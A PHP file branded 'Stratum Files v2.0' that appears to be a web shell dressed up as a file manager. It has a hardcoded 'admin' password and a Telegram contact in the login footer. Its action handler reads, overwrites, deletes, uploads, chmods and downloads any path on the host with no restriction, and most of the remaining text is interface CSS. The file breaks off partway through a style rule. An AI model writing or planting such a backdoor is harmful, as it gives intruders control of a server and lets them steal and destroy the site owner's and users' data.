<?php
session_start();
$pass = "admin";
$self = $_SERVER['PHP_SELF'];

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $self);
    exit;
}

if (isset($_POST['login'])) {
    if ($_POST['password'] === $pass) {
        $_SESSION['token'] = md5($pass . $_SERVER['REMOTE_ADDR']);
        header("Location: " . $self);
        exit;
    }
}

if (!isset($_SESSION['token']) || $_SESSION['token'] !== md5($pass . $_SERVER['REMOTE_ADDR'])) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Stratum — Access</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
<style>
:root{--white:#fff;--bg:#F7F7F5;--ink:#0C0C0A;--ink-2:#4A4A46;--ink-3:#9A9A94;--ink-4:#C8C8C2;--border:#E4E4DF;--blue:#0057FF;--blue-bg:#EEF3FF;--blue-mid:rgba(0,87,255,0.08);--red:#D92D20;--f-ui:'Plus Jakarta Sans',sans-serif;--f-code:'Fira Code',monospace;--sh-lg:0 16px 48px rgba(12,12,10,0.11),0 4px 12px rgba(12,12,10,0.06);--ease:cubic-bezier(0.16,1,0.3,1);}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
html,body{height:100%;}
body{background:var(--bg);font-family:var(--f-ui);display:flex;align-items:center;justify-content:center;padding:1.5rem;-webkit-font-smoothing:antialiased;position:relative;}
body::before{content:'';position:fixed;inset:0;background-image:radial-gradient(circle,var(--ink-4) 1px,transparent 1px);background-size:28px 28px;opacity:.2;pointer-events:none;}
.card{position:relative;z-index:1;background:var(--white);border:1px solid var(--border);border-radius:18px;box-shadow:var(--sh-lg);width:100%;max-width:380px;overflow:hidden;animation:up .5s var(--ease) both;}
@keyframes up{from{opacity:0;transform:translateY(16px) scale(.98)}to{opacity:1;transform:none}}
.card-head{padding:1.75rem 1.75rem 0;text-align:center;}
.logo-ring{width:52px;height:52px;background:var(--ink);border-radius:14px;display:flex;align-items:center;justify-content:center;margin:0 auto 1rem;}
.app-name{font-size:20px;font-weight:700;letter-spacing:-.03em;color:var(--ink);}
.app-sub{font-family:var(--f-code);font-size:10px;color:var(--ink-3);letter-spacing:.1em;text-transform:uppercase;margin-top:.25rem;}
.card-body{padding:1.5rem 1.75rem 1.75rem;}
.field{display:flex;flex-direction:column;gap:.35rem;margin-bottom:.875rem;}
.field-label{font-family:var(--f-code);font-size:9.5px;font-weight:500;letter-spacing:.1em;text-transform:uppercase;color:var(--ink-3);}
.field-wrap{position:relative;}
input[type=password]{width:100%;padding:.65rem .875rem;background:var(--bg);border:1.5px solid var(--border);border-radius:10px;color:var(--ink);font-family:var(--f-code);font-size:13px;outline:none;transition:border-color .18s,box-shadow .18s;-webkit-appearance:none;}
input[type=password]:focus{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 3px var(--blue-mid);}
input::placeholder{color:var(--ink-4);}
.err-msg{font-size:11.5px;color:var(--red);text-align:center;margin-bottom:.75rem;font-weight:500;}
.submit-btn{width:100%;padding:.8rem 1rem;background:var(--ink);color:white;border:none;border-radius:10px;font-family:var(--f-ui);font-size:13px;font-weight:700;cursor:pointer;transition:background .18s,transform .15s;display:flex;align-items:center;justify-content:center;gap:.5rem;}
.submit-btn:hover{background:#222220;}
.submit-btn:active{transform:scale(.98);}
.card-foot{padding:.875rem 1.75rem;border-top:1px solid var(--border);background:var(--bg);text-align:center;font-family:var(--f-code);font-size:9px;color:var(--ink-4);letter-spacing:.04em;}
.card-foot a{color:var(--blue);text-decoration:none;}
</style>
</head>
<body>
<div class="card">
  <div class="card-head">
    <div class="logo-ring">
      <svg width="22" height="22" viewBox="0 0 22 22" fill="none">
        <rect x="2" y="2" width="8" height="8" rx="2" fill="white"/>
        <rect x="12" y="2" width="8" height="8" rx="2" fill="white" opacity=".5"/>
        <rect x="2" y="12" width="8" height="8" rx="2" fill="white" opacity=".5"/>
        <rect x="12" y="12" width="8" height="8" rx="2" fill="white" opacity=".25"/>
      </svg>
    </div>
    <div class="app-name">Stratum Files</div>
    <div class="app-sub">Restricted Access</div>
  </div>
  <div class="card-body">
    <?php if(isset($_POST['login'])): ?>
    <div class="err-msg">Invalid access key. Try again.</div>
    <?php endif; ?>
    <form method="post">
      <div class="field">
        <label class="field-label">Access Key</label>
        <div class="field-wrap">
          <input type="password" name="password" placeholder="••••••••••••" autofocus autocomplete="current-password">
        </div>
      </div>
      <button type="submit" name="login" class="submit-btn">
        <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M2 7H12M8 3L12 7L8 11" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
        Authenticate
      </button>
    </form>
  </div>
  <div class="card-foot">Stratum Files v2.0 · <a href="https://t.me/envrc">@envrc</a></div>
</div>
</body>
</html>
<?php
exit;
}

$root = $_SERVER['DOCUMENT_ROOT'];
$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$dir = realpath($dir);
if ($dir === false) $dir = getcwd();
$dir = str_replace('\\', '/', $dir);

function formatSize($bytes) {
    if ($bytes === 0) return '0 B';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
}

function getPerms($path) {
    return substr(sprintf('%o', fileperms($path)), -4);
}

function rrmdir($dir) {
    if (is_dir($dir)) {
        $objects = scandir($dir);
        foreach ($objects as $object) {
            if ($object != "." && $object != "..") {
                if (is_dir($dir . "/" . $object)) rrmdir($dir . "/" . $object);
                else unlink($dir . "/" . $object);
            }
        }
        rmdir($dir);
    }
}

function msg($status, $msg, $data = []) {
    echo json_encode(['status' => $status, 'msg' => $msg, 'data' => $data]);
    exit;
}

if (isset($_GET['action'])) {
    header('Content-Type: application/json');
    $act = $_GET['action'];
    $target = isset($_POST['target']) ? $_POST['target'] : '';
    $path = isset($_POST['path']) ? $_POST['path'] : '';

    try {
        switch ($act) {
            case 'list':
                $items = scandir($path);
                $folders = [];
                $files = [];
                foreach ($items as $item) {
                    if ($item == '.' || $item == '..') continue;
                    $full = $path . '/' . $item;
                    $info = [
                        'name' => $item,
                        'path' => $full,
                        'size' => is_file($full) ? formatSize(filesize($full)) : count(scandir($full)) - 2 . ' items',
                        'mod' => date("M d H:i", filemtime($full)),
                        'perm' => getPerms($full),
                        'type' => is_dir($full) ? 'dir' : pathinfo($full, PATHINFO_EXTENSION)
                    ];
                    if (is_dir($full)) $folders[] = $info;
                    else $files[] = $info;
                }
                msg('success', 'Listed', ['folders' => $folders, 'files' => $files, 'path' => $path]);
                break;

            case 'read':
                if (file_exists($target)) msg('success', 'Read', file_get_contents($target));
                else msg('error', 'File not found');
                break;

            case 'save':
                if (file_put_contents($target, $_POST['content'])) msg('success', 'Saved');
                else msg('error', 'Save failed');
                break;

            case 'delete':
                if (is_dir($target)) { rrmdir($target); msg('success', 'Folder deleted'); }
                elseif (unlink($target)) msg('success', 'File deleted');
                else msg('error', 'Delete failed');
                break;

            case 'rename':
                $new = dirname($target) . '/' . $_POST['name'];
                if (rename($target, $new)) msg('success', 'Renamed');
                else msg('error', 'Rename failed');
                break;

            case 'create_folder':
                if (mkdir($path . '/' . $_POST['name'])) msg('success', 'Created');
                else msg('error', 'Failed');
                break;

            case 'create_file':
                if (touch($path . '/' . $_POST['name'])) msg('success', 'Created');
                else msg('error', 'Failed');
                break;

            case 'upload':
                if (!empty($_FILES)) {
                    foreach ($_FILES['files']['name'] as $i => $name) {
                        move_uploaded_file($_FILES['files']['tmp_name'][$i], $path . '/' . $name);
                    }
                    msg('success', 'Uploaded');
                }
                break;

            case 'zip':
                $zip = new ZipArchive();
                $zipName = $target . '.zip';
                if ($zip->open($zipName, ZipArchive::CREATE) === TRUE) {
                    if (is_dir($target)) {
                        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target), RecursiveIteratorIterator::LEAVES_ONLY);
                        foreach ($files as $name => $file) {
                            if (!$file->isDir()) {
                                $filePath = $file->getRealPath();
                                $relativePath = substr($filePath, strlen($target) + 1);
                                $zip->addFile($filePath, $relativePath);
                            }
                        }
                    } else {
                        $zip->addFile($target, basename($target));
                    }
                    $zip->close();
                    msg('success', 'Zipped');
                }
                msg('error', 'Zip failed');
                break;

            case 'unzip':
                $zip = new ZipArchive;
                if ($zip->open($target) === TRUE) {
                    $zip->extractTo(dirname($target));
                    $zip->close();
                    msg('success', 'Extracted');
                } else msg('error', 'Unzip failed');
                break;

            case 'chmod':
                if(chmod($target, octdec($_POST['perms']))) msg('success', 'Permissions changed');
                else msg('error', 'Failed');
                break;

            case 'copy_item':
                $_SESSION['clipboard'] = ['type' => 'copy', 'path' => $target];
                msg('success', 'Copied to clipboard');
                break;

            case 'cut_item':
                $_SESSION['clipboard'] = ['type' => 'cut', 'path' => $target];
                msg('success', 'Cut to clipboard');
                break;

            case 'paste_item':
                if(!isset($_SESSION['clipboard'])) msg('error', 'Empty clipboard');
                $src = $_SESSION['clipboard']['path'];
                $dst = $path . '/' . basename($src);
                if($_SESSION['clipboard']['type'] == 'copy') {
                    if(is_dir($src)) {
                        msg('error', 'Folder copy not supported in basic mode');
                    } else {
                        copy($src, $dst);
                    }
                } else {
                    rename($src, $dst);
                    unset($_SESSION['clipboard']);
                }
                msg('success', 'Pasted');
                break;
        }
    } catch (Exception $e) {
        msg('error', $e->getMessage());
    }
    exit;
}

if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Stratum Files</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&family=Fira+Code:wght@300;400;500&display=swap" rel="stylesheet">
<script src="https://unpkg.com/lucide@latest"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/ace.js"></script>
<style>
/* ── TOKENS ──────────────────────────────────────────── */
:root{
  --white:#FFFFFF;--bg:#F7F7F5;--bg-2:#F0F0ED;--bg-3:#E8E8E4;
  --ink:#0C0C0A;--ink-2:#4A4A46;--ink-3:#9A9A94;--ink-4:#C8C8C2;
  --border:#E4E4DF;--border-2:#D0D0CA;
  --blue:#0057FF;--blue-bg:#EEF3FF;--blue-mid:rgba(0,87,255,0.08);--blue-dark:#0044CC;
  --green:#00875A;--green-bg:#E6F5EF;--green-mid:rgba(0,135,90,0.1);
  --red:#D92D20;--red-bg:#FEF3F2;--red-mid:rgba(217,45,32,0.08);
  --amber:#B54708;--amber-bg:#FFFAEB;
  --purple:#6D28D9;--purple-bg:#F5F0FF;
  --f-ui:'Plus Jakarta Sans',sans-serif;--f-code:'Fira Code',monospace;
  --ease:cubic-bezier(0.16,1,0.3,1);--ease-std:cubic-bezier(0.4,0,0.2,1);
  --sh-sm:0 1px 4px rgba(12,12,10,0.07),0 1px 2px rgba(12,12,10,0.04);
  --sh-md:0 4px 16px rgba(12,12,10,0.09),0 2px 6px rgba(12,12,10,0.05);
  --sh-lg:0 16px 48px rgba(12,12,10,0.11),0 4px 12px rgba(12,12,10,0.06);
  --nav-h:52px;--sub-h:38px;
}

*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
html,body{height:100%;overflow:hidden;}
body{background:var(--bg);color:var(--ink);font-family:var(--f-ui);font-size:13px;-webkit-font-smoothing:antialiased;display:flex;flex-direction:column;}

::-webkit-scrollbar{width:4px;height:4px;}
::-webkit-scrollbar-track{background:transparent;}
::-webkit-scrollbar-thumb{background:var(--ink-4);border-radius:2px;}

button,input,textarea{font-family:var(--f-ui);}
button{cursor:pointer;border:none;background:none;}
a{color:inherit;text-decoration:none;}

/* ── NAV ─────────────────────────────────────────────── */
.nav{
  height:var(--nav-h);background:var(--white);border-bottom:1px solid var(--border);
  display:flex;align-items:center;justify-content:space-between;
  padding:0 1rem;gap:.75rem;flex-shrink:0;z-index:50;position:relative;
}

.nav-brand{display:flex;align-items:center;gap:.5rem;flex-shrink:0;}
.nav-icon{
  width:28px;height:28px;background:var(--ink);border-radius:7px;
  display:flex;align-items:center;justify-content:center;flex-shrink:0;
}
.nav-name{font-size:13px;font-weight:700;letter-spacing:-.03em;color:var(--ink);}
.nav-name span{color:var(--blue);}
.nav-badge{font-family:var(--f-code);font-size:8.5px;padding:2px 5px;border-radius:4px;background:var(--blue-bg);color:var(--blue);font-weight:500;letter-spacing:.04em;}

.search-wrap{
  flex:1;max-width:420px;
  display:flex;align-items:center;gap:.5rem;
  padding:.4rem .75rem;background:var(--bg);border:1.5px solid var(--border);
  border-radius:8px;transition:border-color .18s,box-shadow .18s;
}
.search-wrap:focus-within{border-color:var(--blue);box-shadow:0 0 0 3px var(--blue-mid);background:var(--white);}
.search-wrap input{flex:1;border:none;background:none;font-size:12px;color:var(--ink);outline:none;font-family:var(--f-ui);}
.search-wrap input::placeholder{color:var(--ink-4);}
.search-kbd{font-family:var(--f-code);font-size:9px;padding:1px 5px;background:var(--white);border:1px solid var(--border);border-radius:4px;color:var(--ink-3);flex-shrink:0;}

.nav-actions{display:flex;align-items:center;gap:.375rem;flex-shrink:0;}

.nav-btn{
  height:32px;padding:0 .75rem;border-radius:7px;border:1px solid var(--border);
  background:transparent;color:var(--ink-2);font-size:12px;font-weight:600;
  display:flex;align-items:center;gap:.35rem;transition:all .15s;
}
.nav-btn:hover{background:var(--bg);color:var(--ink);border-color:var(--border-2);}
.nav-btn.primary{background:var(--ink);border-color:var(--ink);color:white;}
.nav-btn.primary:hover{background:#222220;}
.nav-btn.icon-only{width:32px;padding:0;justify-content:center;}
.nav-btn.danger:hover{background:var(--red-bg);border-color:rgba(217,45,32,0.2);color:var(--red);}

/* ── SUBBAR ──────────────────────────────────────────── */
.subbar{
  height:var(--sub-h);background:var(--white);border-bottom:1px solid var(--border);
  display:flex;align-items:center;justify-content:space-between;
  padding:0 1rem;gap:.75rem;flex-shrink:0;
}
.subbar-left{display:flex;align-items:center;gap:.5rem;flex:1;min-width:0;}
.subbar-right{display:flex;align-items:center;gap:.375rem;flex-shrink:0;}

/* Breadcrumb */
.breadcrumb{display:flex;align-items:center;gap:0;font-size:12px;overflow-x:auto;scrollbar-width:none;-webkit-overflow-scrolling:touch;}
.breadcrumb::-webkit-scrollbar{display:none;}
.bc-seg{
  display:flex;align-items:center;gap:.25rem;
  padding:.2rem .375rem;border-radius:5px;
  color:var(--ink-3);cursor:pointer;transition:all .15s;
  white-space:nowrap;font-weight:500;
}
.bc-seg:hover{background:var(--bg);color:var(--ink);}
.bc-seg.current{color:var(--ink);font-weight:700;cursor:default;background:var(--bg-2);}
.bc-sep{color:var(--ink-4);font-size:11px;padding:0 .1rem;flex-shrink:0;}

.view-toggle{display:flex;gap:1px;background:var(--bg-2);border:1px solid var(--border);border-radius:6px;padding:2px;overflow:hidden;}
.vt-btn{width:26px;height:22px;border-radius:4px;display:flex;align-items:center;justify-content:center;color:var(--ink-3);transition:all .15s;}
.vt-btn.active{background:var(--white);color:var(--ink);box-shadow:var(--sh-sm);}
.vt-btn:hover:not(.active){color:var(--ink-2);}

.sort-select{
  font-family:var(--f-code);font-size:10px;color:var(--ink-2);
  background:transparent;border:none;outline:none;cursor:pointer;
  padding:.2rem .375rem;border-radius:5px;transition:background .15s;
}
.sort-select:hover{background:var(--bg);}

.info-chip{
  display:flex;align-items:center;gap:.3rem;
  font-family:var(--f-code);font-size:9.5px;color:var(--ink-3);
  padding:.2rem .5rem;background:var(--bg);border:1px solid var(--border);border-radius:5px;
  flex-shrink:0;
}

/* ── MAIN ────────────────────────────────────────────── */
.workspace{flex:1;overflow:hidden;display:flex;position:relative;}
.file-pane{flex:1;overflow-y:auto;padding:1rem;position:relative;}

/* ── GRID ────────────────────────────────────────────── */
.section-label{
  font-family:var(--f-code);font-size:9px;letter-spacing:.1em;text-transform:uppercase;
  color:var(--ink-4);margin-bottom:.5rem;margin-top:.25rem;padding:0 .25rem;
}

.file-grid{
  display:grid;
  grid-template-columns:repeat(auto-fill,minmax(130px,1fr));
  gap:.75rem;
  margin-bottom:1rem;
}

.file-card{
  background:var(--white);border:1.5px solid var(--border);border-radius:12px;
  padding:.875rem .75rem .75rem;cursor:pointer;position:relative;
  transition:border-color .18s,box-shadow .18s,transform .18s var(--ease);
  user-select:none;-webkit-tap-highlight-color:transparent;
  display:flex;flex-direction:column;gap:.5rem;
  animation:card-in .3s var(--ease) both;
}
@keyframes card-in{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}

.file-card:hover{border-color:var(--border-2);box-shadow:var(--sh-sm);transform:translateY(-1px);}
.file-card:active{transform:scale(.97);box-shadow:none;}
.file-card.selected{border-color:var(--blue);box-shadow:0 0 0 3px var(--blue-mid);background:var(--blue-bg);}

.file-card-more{
  position:absolute;top:.5rem;right:.5rem;
  width:22px;height:22px;border-radius:5px;
  display:flex;align-items:center;justify-content:center;
  color:var(--ink-4);transition:all .15s;
  opacity:0;
}
.file-card:hover .file-card-more{opacity:1;}
.file-card-more:hover{background:var(--bg-2);color:var(--ink-2);}

.file-icon-wrap{
  width:40px;height:40px;border-radius:10px;
  display:flex;align-items:center;justify-content:center;
  flex-shrink:0;
}

.file-name{
  font-size:12px;font-weight:600;color:var(--ink);
  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
  line-height:1.3;
}

.file-meta{
  display:flex;align-items:center;justify-content:space-between;
  gap:.25rem;
}
.file-size{font-family:var(--f-code);font-size:9.5px;color:var(--ink-3);}
.file-perm{font-family:var(--f-code);font-size:8.5px;padding:1px 4px;background:var(--bg-2);border-radius:3px;color:var(--ink-3);}

/* ── LIST VIEW ───────────────────────────────────────── */
.file-list-table{width:100%;border-collapse:collapse;margin-bottom:1rem;}
.file-list-table th{
  font-family:var(--f-code);font-size:9px;letter-spacing:.08em;text-transform:uppercase;
  color:var(--ink-3);padding:.5rem .75rem;text-align:left;font-weight:400;
  border-bottom:1px solid var(--border);background:var(--bg);position:sticky;top:0;z-index:1;
}
.file-list-table td{
  padding:.5rem .75rem;font-size:12px;color:var(--ink-2);
  border-bottom:1px solid var(--border);transition:background .1s;vertical-align:middle;
}
.file-list-table tbody tr{cursor:pointer;animation:card-in .25s var(--ease) both;}
.file-list-table tbody tr:hover td{background:var(--bg);}
.file-list-table tbody tr.selected td{background:var(--blue-bg);}
.file-list-table tbody tr:last-child td{border-bottom:none;}
.list-name{display:flex;align-items:center;gap:.625rem;font-weight:600;color:var(--ink);}
.list-icon{width:26px;height:26px;border-radius:7px;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
.list-mono{font-family:var(--f-code);font-size:10.5px;}
.list-actions{display:flex;gap:.25rem;opacity:0;transition:opacity .15s;}
.file-list-table tbody tr:hover .list-actions{opacity:1;}

/* ── ICON COLORS ─────────────────────────────────────── */
.ic-dir{background:rgba(181,71,8,.1);color:var(--amber);}
.ic-php{background:rgba(109,40,217,.1);color:var(--purple);}
.ic-js{background:rgba(181,71,8,.08);color:#CA8A04;}
.ic-html{background:rgba(217,45,32,.08);color:var(--red);}
.ic-css{background:rgba(0,87,255,.08);color:var(--blue);}
.ic-img{background:rgba(0,135,90,.08);color:var(--green);}
.ic-zip{background:rgba(181,71,8,.08);color:var(--amber);}
.ic-txt{background:rgba(74,74,70,.08);color:var(--ink-2);}
.ic-def{background:var(--bg-2);color:var(--ink-3);}

/* ── EMPTY / LOADING ─────────────────────────────────── */
.empty-state{
  display:flex;flex-direction:column;align-items:center;justify-content:center;
  padding:4rem 2rem;text-align:center;gap:.75rem;
  color:var(--ink-3);
}
.empty-state-icon{width:48px;height:48px;border-radius:12px;background:var(--bg-2);display:flex;align-items:center;justify-content:center;color:var(--ink-4);}
.empty-state-title{font-size:14px;font-weight:600;color:var(--ink-2);}
.empty-state-sub{font-size:12px;color:var(--ink-4);max-width:240px;}

.loader-wrap{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:4rem;gap:.875rem;}
.loader{width:28px;height:28px;border:2.5px solid var(--border);border-top-color:var(--blue);border-radius:50%;animation:spin 0.8s linear infinite;}
@keyframes spin{to{transform:rotate(360deg)}}

/* ── CONTEXT MENU ────────────────────────────────────── */
.ctx{
  position:fixed;z-index:300;background:var(--white);
  border:1px solid var(--border);border-radius:12px;
  box-shadow:var(--sh-lg);min-width:176px;
  display:none;overflow:hidden;
  animation:ctx-in .15s var(--ease);
}
@keyframes ctx-in{from{opacity:0;transform:scale(.96)}to{opacity:1;transform:scale(1)}}

.ctx-section{padding:.375rem;}
.ctx-sep{height:1px;background:var(--border);margin:.25rem 0;}
.ctx-item{
  display:flex;align-items:center;gap:.625rem;
  padding:.45rem .625rem;border-radius:7px;
  font-size:12px;font-weight:500;color:var(--ink-2);cursor:pointer;
  transition:background .12s,color .12s;width:100%;text-align:left;border:none;background:none;
}
.ctx-item:hover{background:var(--bg);color:var(--ink);}
.ctx-item.ctx-danger{color:var(--red);}
.ctx-item.ctx-danger:hover{background:var(--red-bg);}
.ctx-item .ctx-shortcut{margin-left:auto;font-family:var(--f-code);font-size:9px;color:var(--ink-4);}

/* ── MODALS ──────────────────────────────────────────── */
.modal-backdrop{
  position:fixed;inset:0;background:rgba(12,12,10,.35);
  z-index:200;display:flex;align-items:center;justify-content:center;
  padding:1rem;backdrop-filter:blur(3px);
}
.modal-backdrop.hidden{display:none;}

.modal{
  background:var(--white);border:1px solid var(--border);border-radius:16px;
  box-shadow:var(--sh-lg);width:100%;max-width:460px;overflow:hidden;
  animation:modal-in .3s var(--ease);
}
@keyframes modal-in{from{opacity:0;transform:scale(.96) translateY(12px)}to{opacity:1;transform:none}}

.modal-head{
  padding:.875rem 1.125rem;border-bottom:1px solid var(--border);
  display:flex;align-items:center;justify-content:space-between;gap:.5rem;
}
.modal-title{font-size:13px;font-weight:700;letter-spacing:-.01em;}
.modal-close{
  width:28px;height:28px;border-radius:6px;display:flex;align-items:center;justify-content:center;
  color:var(--ink-3);cursor:pointer;transition:all .15s;
}
.modal-close:hover{background:var(--bg);color:var(--ink);}

.modal-body{padding:1.125rem;}
.modal-foot{padding:.875rem 1.125rem;border-top:1px solid var(--border);display:flex;justify-content:flex-end;gap:.5rem;}

.form-field{display:flex;flex-direction:column;gap:.35rem;margin-bottom:.875rem;}
.form-field:last-child{margin-bottom:0;}
.form-label{font-family:var(--f-code);font-size:9.5px;font-weight:500;letter-spacing:.1em;text-transform:uppercase;color:var(--ink-3);}
.form-input{
  width:100%;padding:.6rem .875rem;background:var(--bg);border:1.5px solid var(--border);
  border-radius:9px;color:var(--ink);font-family:var(--f-code);font-size:12px;outline:none;
  transition:border-color .18s,box-shadow .18s;
}
.form-input:focus{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 3px var(--blue-mid);}
.form-input::placeholder{color:var(--ink-4);}

.btn{
  display:inline-flex;align-items:center;gap:.4rem;
  padding:.45rem .875rem;border-radius:7px;font-size:12px;font-weight:600;
  font-family:var(--f-ui);cursor:pointer;transition:all .15s;border:1px solid transparent;line-height:1;
}
.btn-ghost{background:transparent;border-color:var(--border);color:var(--ink-2);}
.btn-ghost:hover{background:var(--bg);color:var(--ink);border-color:var(--border-2);}
.btn-primary{background:var(--ink);border-color:var(--ink);color:white;}
.btn-primary:hover{background:#222220;}
.btn-blue{background:var(--blue);border-color:var(--blue);color:white;}
.btn-blue:hover{background:var(--blue-dark);}
.btn-red{background:var(--red);border-color:var(--red);color:white;}
.btn-red:hover{background:#B91C1C;}
.btn-sm{padding:.3rem .625rem;font-size:11px;}

/* ── EDITOR MODAL ────────────────────────────────────── */
.editor-modal{
  position:fixed;inset:0;z-index:200;display:flex;flex-direction:column;
  background:var(--white);
  animation:modal-in .3s var(--ease);
}
.editor-modal.hidden{display:none;}

.editor-topbar{
  height:var(--nav-h);background:var(--white);border-bottom:1px solid var(--border);
  display:flex;align-items:center;gap:.75rem;padding:0 1rem;flex-shrink:0;
}
.editor-filename{
  font-family:var(--f-code);font-size:12px;font-weight:500;color:var(--ink);
  display:flex;align-items:center;gap:.5rem;
}
.editor-modified{width:6px;height:6px;border-radius:50%;background:var(--amber);}
.editor-status{
  display:flex;align-items:center;gap:.5rem;
  margin-left:auto;
}
.editor-lang{font-family:var(--f-code);font-size:10px;padding:2px 6px;border-radius:4px;background:var(--bg-2);color:var(--ink-2);}
.editor-lines{font-family:var(--f-code);font-size:10px;color:var(--ink-3);}

#aceEditor{flex:1;width:100%;font-family:var(--f-code);}

/* ── UPLOAD MODAL ────────────────────────────────────── */
.dropzone{
  border:2px dashed var(--border-2);border-radius:12px;
  padding:2.5rem 1.5rem;text-align:center;cursor:pointer;
  transition:border-color .2s,background .2s;
}
.dropzone:hover,.dropzone.drag-over{border-color:var(--blue);background:var(--blue-bg);}
.dropzone-icon{width:44px;height:44px;border-radius:12px;background:var(--bg);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;margin:0 auto .875rem;color:var(--ink-3);}
.dropzone-title{font-size:13px;font-weight:600;color:var(--ink);margin-bottom:.25rem;}
.dropzone-sub{font-size:11.5px;color:var(--ink-3);}

.upload-file-list{display:flex;flex-direction:column;gap:.375rem;margin-top:.75rem;max-height:160px;overflow-y:auto;}
.upload-file-item{
  display:flex;align-items:center;gap:.625rem;
  padding:.5rem .625rem;background:var(--bg);border:1px solid var(--border);border-radius:8px;
  font-size:11.5px;color:var(--ink-2);
}
.upload-file-name{flex:1;min-width:0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-weight:500;color:var(--ink);}
.upload-file-size{font-family:var(--f-code);font-size:9.5px;color:var(--ink-3);flex-shrink:0;}
.upload-progress-bar{height:3px;background:var(--border);border-radius:2px;overflow:hidden;margin-top:.25rem;}
.upload-progress-fill{height:100%;background:var(--blue);border-radius:2px;transition:width .4s var(--ease);}

/* ── CLIPBOARD BAR ───────────────────────────────────── */
.clipboard-bar{
  position:fixed;bottom:1.25rem;left:50%;transform:translateX(-50%) translateY(100px);
  background:var(--ink);color:white;
  border-radius:12px;padding:.625rem 1rem;
  display:flex;align-items:center;gap:.875rem;
  box-shadow:var(--sh-lg);z-index:100;
  transition:transform .4s var(--ease);
  white-space:nowrap;
}
.clipboard-bar.visible{transform:translateX(-50%) translateY(0);}
.clipboard-bar-label{font-size:11.5px;display:flex;align-items:center;gap:.4rem;color:rgba(255,255,255,.7);}
.clipboard-bar-name{font-family:var(--f-code);font-size:11px;color:white;font-weight:500;}

/* ── FAB ─────────────────────────────────────────────── */
.fab-wrap{position:fixed;bottom:1.25rem;right:1.25rem;z-index:90;display:flex;flex-direction:column-reverse;align-items:flex-end;gap:.5rem;}
.fab{
  width:46px;height:46px;border-radius:50%;
  background:var(--ink);color:white;
  display:flex;align-items:center;justify-content:center;
  box-shadow:var(--sh-md);cursor:pointer;transition:all .2s var(--ease);border:none;
}
.fab:hover{background:#222220;transform:scale(1.06);}
.fab:active{transform:scale(.95);}
.fab.open{background:var(--red);transform:rotate(45deg);}
.fab-menu{
  display:flex;flex-direction:column-reverse;gap:.375rem;
  opacity:0;pointer-events:none;transition:opacity .2s var(--ease),transform .2s var(--ease);
  transform:translateY(12px);
}
.fab-menu.open{opacity:1;pointer-events:all;transform:translateY(0);}
.fab-sub{
  display:flex;align-items:center;gap:.625rem;background:var(--white);
  border:1px solid var(--border);border-radius:24px;
  padding:.4rem .875rem .4rem .5rem;
  box-shadow:var(--sh-sm);cursor:pointer;transition:all .15s;
  font-size:12px;font-weight:600;color:var(--ink);
}
.fab-sub:hover{background:var(--bg);box-shadow:var(--sh-md);}
.fab-sub-icon{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;}

/* ── TOASTS ──────────────────────────────────────────── */
.toast-wrap{position:fixed;top:calc(var(--nav-h) + var(--sub-h) + .75rem);right:.875rem;z-index:400;display:flex;flex-direction:column;gap:.375rem;pointer-events:none;}
.toast{
  display:flex;align-items:center;gap:.625rem;
  padding:.6rem .875rem;background:var(--ink);color:white;
  border-radius:10px;font-size:12px;font-weight:500;
  box-shadow:var(--sh-lg);pointer-events:all;
  animation:t-in .35s var(--ease) both;max-width:300px;
}
.toast.exiting{animation:t-out .3s var(--ease) both;}
@keyframes t-in{from{opacity:0;transform:translateX(16px)}to{opacity:1;transform:none}}
@keyframes t-out{to{opacity:0;transform:translateX(16px)}}
.toast.ok .toast-icon{color:#4ADE80;}
.toast.err .toast-icon{color:#F87171;}
.toast.info .toast-icon{color:#60A5FA;}
.toast.warn .toast-icon{color:#FBBF24;}
.toast-msg{flex:1;line-height:1.4;}

/* ── PATH TRAVEL INDICATOR ───────────────────────────── */
.nav-trail{
  position:absolute;bottom:0;left:0;right:0;height:2px;background:var(--border);overflow:hidden;
}
.nav-trail-fill{
  height:100%;background:var(--blue);width:0%;
  transition:width .6s var(--ease);border-radius:0 2px 2px 0;
}

/* ── SELECTION BAR ───────────────────────────────────── */
.sel-bar{
  position:fixed;bottom:1.25rem;left:50%;
  transform:translateX(-50%) translateY(100px);
  background:var(--white);border:1px solid var(--border);
